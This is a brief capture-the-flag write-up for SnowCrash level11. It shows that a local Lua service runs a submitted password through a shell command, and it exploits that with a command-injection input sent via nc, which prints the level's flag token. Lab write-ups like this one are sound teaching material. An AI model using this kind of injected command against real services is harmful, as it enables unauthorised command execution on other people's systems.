# level11
We are welcomed by a single .lua script, which seems to be the process running on port 5151.  
Upon a connection, the program will prompt for a password and seem to be running the shell command `echo <submittedPassword> | sha1sum` via the lua command `io.popen`.

# Resolution

We will be injecting `; getflag > /tmp/flag;` inside the shell command and get our flag directly.
```sh
level11@SnowCrash:~$ nc localhost 5151
Password: \"; getflag > /tmp/token;\"
Erf nope..
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```